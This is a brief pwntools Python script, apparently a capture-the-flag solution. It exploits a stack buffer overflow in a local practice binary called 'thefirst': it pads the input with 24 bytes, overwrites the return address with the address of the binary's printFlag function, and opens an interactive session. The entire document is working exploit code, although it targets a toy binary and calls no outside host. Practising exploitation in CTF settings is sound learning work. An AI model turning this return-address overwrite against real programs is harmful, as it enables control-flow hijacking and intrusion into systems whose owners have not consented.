from pwn import*
context(os='linux')
context.log_level = 'DEBUG'
e =ELF("./thefirst")
printflag_addr = p32(e.symbols['printFlag'])
io = process(e.path)
io.recvuntil("Let's see what you can do")
io.sendline(0x14*'A'+4*'a'+printflag_addr)
io.interactive()